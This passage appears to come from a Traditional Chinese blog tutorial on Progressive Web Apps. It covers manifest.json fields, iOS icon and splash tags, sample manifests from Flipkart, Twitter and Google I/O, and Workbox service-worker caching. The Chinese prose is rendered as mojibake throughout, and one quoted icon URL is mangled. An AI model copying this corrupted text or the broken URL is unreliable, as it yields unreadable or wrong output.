rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-640x1136.png\u0026#34; media=\u0026#34;(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-750x1294.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1125x2436.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1242x2148.png\u0026#34; media=\u0026#34;(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1536x2048.png\u0026#34; media=\u0026#34;(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1668x2224.png\u0026#34; media=\u0026#34;(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-2048x2732.png\u0026#34; media=\u0026#34;(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; icons æ‡‰ç”¨ç¨‹å¼çš„åœ–ç¤ºï¼Œicons è£¡æ”¾é™£åˆ—ï¼Œæ”¾ä¸åŒå°ºå¯¸ä¸‹çš„ä¸»è¦åœ–ç¤ºï¼Œå¦‚æœ Splash Screen è£¡è¦ç”¨çš„åœ–ç¤ºï¼Œå¤§å°å¿…é ˆåŒ…å« 192pxã€512pxã€‚\nicons è£¡ï¼Œé™£åˆ—è£¡çš„æ¯ä¸€å€‹ç‰©ä»¶æœ‰ 3 å€‹æˆå“¡ï¼š\nsizes åœ–ç‰‡å°ºå¯¸ï¼Œå¯ç”¨åœ¨å¤šå€‹å°ºå¯¸ä¸Šçš„è©±ç”¨ç©ºç™½éµå€éš”ã€‚ src åœ–ç‰‡çš„è·¯å¾‘ï¼Œå¦‚æœæ˜¯ç›¸å°è·¯å¾‘ï¼Œæ˜¯ä»¥ manifest æ‰€åœ¨çš„ä½ç½®ç‚ºåŸºæº–ã€‚ type åœ–æª”é¡å‹ï¼Œé€™é …æ’å¿…å¡«ï¼Œä¸»è¦æ˜¯å‘ŠçŸ¥è£ç½®é¡å‹ï¼Œè®“ä¸æ”¯æ´çš„è£ç½®å¯ä»¥å¿«é€Ÿç•¥éã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.ico\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72 96x96 128x128 256x256\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.svg\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72\u0026#34; } ] ç”±æ–¼ manifest åœ¨ IOS ä¸Šé‚„ä¸æ”¯æ´ï¼Œå› æ­¤å¦‚æœ IOS ä¸Šä¹Ÿæƒ³è¦è‡ªè¨‚ iconï¼Œå°±è¦æ”¹ç”¨ HTML è£¡çš„ meta ä¾†è¨­å®šï¼Œå¦‚ä¸‹ï¼š\n1 2 3 \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;apple-icon-57x57.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;72x72\u0026#34; href=\u0026#34;apple-icon-72x72.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;apple-icon-114x114.png\u0026#34; /\u0026gt; name æ‡‰ç”¨ç¨‹å¼çš„å®Œæ•´åç¨±ï¼Œæœƒé¡¯ç¤ºåœ¨ Splash Screenä¸Šï¼Œä»¥åŠä¸»ç•«é¢ä¸Šçš„åç¨±ã€‚\n1 \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; short_name æ‡‰ç”¨ç¨‹å¼çš„ç°¡å¯«ï¼Œç•¶ name å¤ªé•·è€Œç„¡æ³•é¡¯ç¤ºæ™‚ï¼Œæœƒæ”¹æˆé¡¯ç¤ºç°¡å¯«ã€‚\n1 \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; lang ä¸»è¦èªè¨€ï¼Œé‡å° nameã€short_name é€™å…©å€‹ä½¿ç”¨çš„ã€‚\nèªè¨€åˆ—è¡¨å¯ä»¥åœ¨é€™æ‰¾ï¼šhttps://www.iana.org\n1 \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34; description æ‡‰ç”¨ç¨‹å¼çš„æè¿°ï¼Œæè¿°é€™å€‹æ‡‰ç”¨ç¨‹å¼æ˜¯åšä»€éº¼çš„ã€‚\n1 \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34; dir æ–‡å­—æ›¸å¯«æ–¹å‘ï¼Œå€¼æœ‰ 3 å€‹ï¼šltrï¼ˆå·¦è‡³å³ï¼‰ã€rtlï¼ˆå³è‡³å·¦ï¼‰ã€autoï¼ˆè®“ç€è¦½å™¨è‡ªå·±æ±ºå®šï¼‰ï¼Œä¸å¡«çš„è©±é è¨­å€¼æ˜¯ autoã€‚\n1 \u0026#34;dir\u0026#34;: \u0026#34;ltr\u0026#34; display æ‡‰ç”¨ç¨‹å¼çš„é¡¯ç¤ºæ¨¡å¼ï¼Œé¡¯ç¤ºæ¨¡å¼æŒ‡çš„æ˜¯å¾ä¸»ç•«é¢é»é–‹ App å¾Œï¼Œè¦é¡¯ç¤ºçš„æ¨£å­ï¼Œæœ‰ 4 å€‹å€¼å¯ç”¨ï¼š\nfullscreenï¼š å…¨è¢å¹•ï¼Œå°±åƒåœ¨ç”¨åŸç”Ÿ App ä¸€æ¨£ï¼Œæœƒéš±è—æ‰€æœ‰çš„ç€è¦½å™¨ UIã€‚ standaloneï¼š æœƒéš±è—æ¨™æº–ç€è¦½å™¨ UI å…ƒç´ ï¼Œå¦‚ URL æ¬„ç­‰ã€‚ browserï¼š é è¨­å€¼ï¼Œå°±åƒä¸€èˆ¬ç”¨ç€è¦½å™¨ä¸€æ¨£ã€‚ minimalï¼š ui æœƒæœ‰å°è¦½åˆ—æœ€å°çš„ UIï¼Œé€™å€‹å€¼ Chrome ä¸æ”¯æ´ã€‚ å¦‚æœè¦ Chrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢çš„è©±ï¼Œè¨­å®šå€¼å¿…é ˆè¦æ˜¯ standaloneã€‚\n1 \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34; orientation é è¨­é¡¯ç¤ºçš„æ–¹å‘æ˜¯ç›´çš„æˆ–æ©«çš„ï¼Œå¯ä»¥å¼·åˆ¶è®“ä½¿ç”¨è€…å¿…é ˆè£ç½®æ‹¿ç›´çš„ï¼ˆlandscapeï¼‰æˆ–æ‹¿æ©«çš„ï¼ˆportraitï¼‰çœ‹ã€‚é€™é»è¦è¨­è¦ä»”ç´°æ€è€ƒéæ‰è¡Œï¼Œå› ç‚ºä½¿ç”¨éƒ½å¤§éƒ¨ä»½éƒ½å–œæ­¡è‡ªå·±æ±ºå®šæ˜¯ç›´çœ‹æˆ–æ¨ªçœ‹ã€‚\nå¦‚æœæ˜¯éŠæˆ²é¡å‹çš„ï¼Œå¯ä»¥è¨­å®šç”¨æ©«çš„ã€‚\n1 \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34; prefer_related_applications æ˜¯å¦è¦æ¨è–¦ä¸€å€‹åŸç”Ÿçš„ Appï¼ŒPWA æ˜¯æ¨¡æ“¬é é¢ç‚º Appï¼Œå¦‚æœç¶²ç«™æœ¬èº«æœ‰å‡º Appï¼Œé€™é …å°±å¯ä»¥è¨­æˆ trueï¼Œå¾ä¸»ç•«é¢é»é–‹é é¢æ™‚å°±æœƒå‡ºç¾å¯ä»¥ä¸‹è¼‰ App çš„æç¤ºã€‚\nå¦‚æœé€™é …ç‚º trueï¼Œå‰‡ä¸‹é¢çš„ related_applications å°±è¦å¡«å…¥å€¼ï¼›é€™é …çš„é è¨­å€¼ç‚º falseã€‚\n1 \u0026#34;prefer_related_applications\u0026#34;: false related_applications æ¨è–¦åŸç”Ÿ App çš„é€£çµï¼Œå€¼æ˜¯é™£åˆ—ï¼Œè£¡é¢æ”¾ App è³‡è¨Šçš„ç‰©ä»¶ï¼Œæ¯é …ç‰©ä»¶æœ‰ 2 å€‹æˆå“¡è¦å¡«ï¼Œæ˜¯ Google Play ä¸Šçš„è©±å‰‡æœ‰ 3 å€‹æˆå“¡ã€‚\nplatformï¼š æ‡‰ç”¨ç¨‹å¼çš„å¹³å°ï¼Œå¯å¡« playã€itunesã€‚ urlï¼š æ‡‰ç”¨ç¨‹å¼çš„ç¶²å€ã€‚ idï¼š Google Playä¸Šè¦å¡«çš„ IDã€‚ 1 2 3 4 5 6 7 8 9 10 11 \u0026#34;related_applications\u0026#34;: [ { \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://play.google.com/store/apps/details?id=com.example.app1\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.example.app1\u0026#34; }, { \u0026#34;platform\u0026#34;: \u0026#34;itunes\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://itunes.apple.com/app/example-app1/id123456789\u0026#34; } ] start_url é–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚çš„é è¨­ç¶²å€ï¼Œå¦‚æœæœ‰è¨­å®šçš„è©±ï¼Œé–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚å°±æœƒé€²åˆ°è¨­å®šçš„ç¶²å€ã€‚æ²’è¨­å®šçš„è©±å°±æ˜¯ä½¿ç”¨è€…æŒ‰åŠ å…¥ä¸»ç•«é¢æ™‚çš„é‚£å€‹ç¶²å€ã€‚\nå¦‚æœå¡«å¯«çš„æ˜¯ç›¸å°è·¯å¾‘ï¼Œæ˜¯ä»¥ manifest æ‰€åœ¨çš„ä½ç½®ç‚ºåŸºæº–ã€‚\nå»ºè­°å¯ä»¥åœ¨ç¶²å€ä¸ŠåŠ å…¥ Google Analytics çš„ utm åƒæ•¸ï¼Œé€™æ¨£åœ¨ GA ä¸Šå°±å¯ä»¥çœ‹è¦‹å¤šå°‘ä¾†æºæ˜¯ä¾†è‡ªæ–¼ PWAï¼Œå¯ä»¥æª¢æ¸¬æˆæ•ˆã€‚\nå¦‚æœè¦ Chrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢çš„è©±ï¼Œé€™é …å¿…é ˆå¡«å¯«ã€‚\n1 \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34; scope æ‡‰ç”¨ç¨‹å¼çš„ä½¿ç”¨ç¯„åœï¼Œé€™é …å¦‚æœæœ‰å¡«ï¼Œé‚£æ‡‰ç”¨ç¨‹å¼çš„ä½œç”¨åŸŸå°±æœƒé™åœ¨æŒ‡å®šçš„ç›®éŒ„è£¡ï¼Œè¶…éæŒ‡å®šç›®éŒ„ï¼Œå°±æœƒç•¶æˆä¸€èˆ¬çš„ç¶²é ç€è¦½ã€‚\n1 \u0026#34;scope\u0026#34;: \u0026#34;/myapp/\u0026#34; manifest.json åŸºæœ¬æª”æ¡ˆå…§å®¹ manifest è£¡çš„æˆå“¡ä¸æ˜¯æ¯é …éƒ½ä¸€å®šè¦å¡«å¯«çš„ï¼Œä»¥ä¸‹é™„ä¸Š manifest.json çš„åŸºæœ¬æª”å…§å®¹ï¼š\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } é—œæ–¼ã€ŒChrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢ã€ PWA èº«ç‚º Google çš„è¦ªèº«å…’å­ï¼Œåœ¨ Android æ‰‹æ©Ÿæ˜¯å¾ˆæœ‰åƒé¦™çš„é»ã€‚\né é¢å¼•ç”¨äº† manifest.json å¾Œï¼Œä½¿ç”¨è€…åœ¨æ‰‹æ©Ÿä¸Šé»é¸åŠ å…¥ä¸»ç•«é¢ï¼Œé é¢å°±å¯ä»¥åƒ App ä¸€æ¨£é¡¯ç¤ºåœ¨æ‰‹æ©Ÿçš„ä¸»ç•«é¢ä¸Šã€‚\nä½†å¾ˆå¤šä½¿ç”¨è€…å…¶å¯¦ä¸çŸ¥é“æœ‰é€™åŠŸèƒ½ï¼Œæˆ–æ˜¯çŸ¥é“äº†ä¹Ÿä¸å¸¸æœƒå»æŒ‰ã€‚\nè²¼å¿ƒçš„ Google é‡å°é€™é»åšäº†ä¸€é …æªæ–½ï¼Œå°±æ˜¯ä¸»å‹•è©¢å•ä½¿ç”¨è€…è¦ä¸è¦å°‡é é¢åŠ å…¥ä¸»ç•«é¢ã€‚\næ ¹æ“š Google çš„èªªæ˜æ–‡ä»¶ï¼šAdd to Home Screenï¼Œè§¸ç™¼ Chrome ä¸»å‹•è©¢å•æ˜¯å¦åŠ å…¥ä¸»ç•«é¢çš„æ¢ä»¶å¦‚ä¸‹ï¼š\nä½¿ç”¨è€…é‚„æ²’åŠ å…¥ä¸»ç•«é¢ åœ¨æœ‰ manifes.json çš„ç¶²åŸŸä¸‹ï¼Œäº’å‹•äº†è‡³å°‘ 30 ç§’ manifset.json è£¡æœ‰å¹¾é …æˆå“¡ä¸€å®šè¦æœ‰ï¼šname æˆ– short_nameã€iconsã€start_urlã€display é é¢è¦æ˜¯ https é é¢æœ‰è£ service-workerï¼ˆsw.jsï¼‰ï¼Œè£¡é¢æœ‰ç›£è½ä¸¦è™•ç† beforeinstallprompt äº‹ä»¶ ç¬¬ 5 é»ï¼Œæ˜¯å¦è¦æœ‰å¯« beforeinstallpromptï¼Œå¥½åƒä¸æ˜¯å¿…å¡«é …ç›®ï¼Œå³ä¾¿æ²’å¡«ï¼Œåœ¨æ¸¬è©¦æ™‚ä¹Ÿæœƒåœ¨åº•éƒ¨å‡ºç¾ä¸€æ¢è©¢å•æ¡†ã€‚\nåœ¨åƒè€ƒäº†é€™ç¯‡ä»¥å¾Œï¼šPWA å¯¦æˆ°ç¶“é©—åˆ†äº«\nç™¼ç¾åˆ¥äººæ˜¯ç”¨åœ¨ UX ä¸Šæ›´å„ªåŒ–çš„åœ°æ–¹ï¼Œå°±æ˜¯è‡ªå·±é¸æ“‡è¦å‡ºç¾è©¢å•æ¡†æ™‚ç”¨çš„ã€‚\nmanifest è§€æ‘© æˆ‘å€‘ä¾†çœ‹çœ‹å¹¾å€‹çŸ¥åçš„ PWA éƒ½æ˜¯æ€éº¼å¯«ä»–å€‘çš„ manifest.jsonã€‚\nç¬¬ä¸€å€‹æ˜¯ PWA ç•Œä¸­å¾ˆæœ‰åçš„ flipkartï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https:/https://static.coderbridge.com/img/techbridge/images1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;656085505957\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;start_url\u0026#34;: \u0026#34;/?start_url=homescreenicon\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;gcm\u0026#34; ], \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#2874f0\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#2874f0\u0026#34; } å†ä¾†æ˜¯é¼é¼å¤§åçš„ twitterï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;It\u0026#39;s what\u0026#39;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;49625052041\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;share_target\u0026#34;: { \u0026#34;action\u0026#34;: \u0026#34;compose/tweet\u0026#34;, \u0026#34;params\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;url\u0026#34; } }, \u0026#34;short_name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34; } æœ€å¾Œå‰‡æ˜¯ Google I/O 2018ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 { \u0026#34;name\u0026#34;: \u0026#34;Google I/O 2018\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;I/O 2018\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;icons\u0026#34;: [{ \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen57.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen114.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen128.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;128x128\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen144.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;144x144\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen192.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }], \u0026#34;prefer_related_applications\u0026#34;: false, \u0026#34;related_applications\u0026#34;: [{ \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.google.samples.apps.iosched\u0026#34; }], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } æˆ‘æ»¿å–œæ­¡è§€å¯Ÿåˆ¥äººå®¶çš„é€™äº›æ±è¥¿ï¼Œå› ç‚ºä½ æœƒç™¼ç¾å¾ˆå¤šä½ æŸ¥è³‡æ–™æ™‚éºæ¼æˆ–æ˜¯æ ¹æœ¬æ‰¾ä¸åˆ°çš„è³‡è¨Šï¼Œè€Œä¸”é€™äº›çœ‹ä¹…äº†ä½ ä¹Ÿæœƒæœ‰å€‹æ¦‚å¿µï¼ŒçŸ¥é“å“ªäº›å±¬æ€§ç‰¹åˆ¥å¸¸ç”¨ï¼Œé™¤äº† manifest.json ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥åƒè€ƒ html è£¡é¢çš„ tagï¼Œä¸€æ¨£èƒ½å­¸ç¿’åˆ°å¾ˆå¤šã€‚\nService Worker ä»‹ç´¹ åŠ å…¥ Service Worker çš„ç›®çš„å°±åªæœ‰ä¸€å€‹ï¼Œé‚£å°±æ˜¯å¿«å–ã€‚é€é Service Workerï¼ˆä»¥ä¸‹ç°¡ç¨± SWï¼‰ï¼Œå¯ä»¥å¹«åŠ©æˆ‘å€‘åœ¨ç™¼é€ request ä¹‹å‰å°±å…ˆæ””æˆªåˆ°ä¸¦ä¸”åšè™•ç†ï¼Œè€Œé›¢ç·šé‹è¡Œçš„åŸç†ä¹Ÿæ˜¯é€™æ¨£çš„ï¼Œæˆ‘å€‘å…ˆåœ¨ç¬¬ä¸€æ¬¡é–‹å•Ÿæ™‚è¨»å†Š SWï¼Œä¸¦ä¸”åˆ©ç”¨ SW ä¸‹è¼‰éœæ…‹æª”æ¡ˆä¸¦å¿«å–ä½ï¼Œä¹‹å¾Œè‹¥ä½¿ç”¨è€…é›¢ç·šï¼Œæˆ‘å€‘å†ç”¨å·²ç¶“å¿«å–ä½çš„æª”æ¡ˆä¾†å›è¦†ï¼Œå°±ä¸æœƒç™¼é€çœŸçš„ requestï¼Œè‡ªç„¶ä¹Ÿä¸æœƒç™¼ç”Ÿç„¡æ³•é€£ç·šçš„æƒ…æ³ã€‚\nè€Œ Google æœ‰æä¾›äº†ä¸€å€‹æ–¹ä¾¿çš„å·¥å…·ï¼šWorkbox ä¾†å¹«åŠ©æˆ‘å€‘è‡ªå‹•ç”¢ç”Ÿå‡º SW ä»¥åŠåˆ©ç”¨æ›´æ–¹ä¾¿çš„èªæ³•ä¾†æ””æˆª requestã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘è‡ªå·±ç”¨çš„æ˜¯ Webpack çš„ pluginï¼š\n1 2 3 4 5 6 7 8 9 10 new workboxPlugin.InjectManifest({ swSrc: path.join(__dirname, \u0026#39;..\u0026#39;, SRC_DIR, \u0026#39;sw.js\u0026#39;), swDest: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR, \u0026#39;sw.js\u0026#39;), globDirectory: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR), globPatterns: [\u0026#39;**/*.{js,css}\u0026#39;] }), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) åªè¦é€™æ¨£ä¸€å¯«ï¼Œå°±æœƒè‡ªå‹•å»æ‰¾ç¬¦åˆè¦å‰‡çš„æª”æ¡ˆä¸¦ä¸”åŠ å…¥å¿«å–æ¸…å–®è£¡é¢ï¼Œä½ åªè¦ä¸€è¨»å†Š SW çš„æ™‚å€™å°±æœƒæŠŠé‚£äº›æª”æ¡ˆçµ¦å¿«å–èµ·ä¾†ã€‚\né™¤æ­¤ä¹‹å¤–å‘¢ï¼ŒWorkbox ä¹Ÿå¯ä»¥é‡å° URL ä¾†ç›£è½ï¼š\nsw.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args =\u0026gt; workbox.strategies .networkFirst({ cacheName: \u0026#39;data-cache\u0026#39;, plugins: [ new workbox.expiration.Plugin({ maxEntries: 100, maxAgeSeconds: 2592000 }) ] }) .handle(args) .then(response =\u0026gt; { return response }) .catch(err =\u0026gt; { console.log(\u0026#39;err:\u0026#39;, err) }) ) åƒä¸Šé¢çš„ç¨‹å¼ç¢¼å°±æ˜¯é‡å°è·¯å¾‘ä¸­å«æœ‰ api çš„ request åšå¿«å–ï¼Œé€™æ¨£åœ¨é›¢ç·šæ™‚ä¹Ÿå¯ä»¥åˆ©ç”¨ä»¥å‰å¿«å–ä½çš„ API responseã€‚\nWorkbox 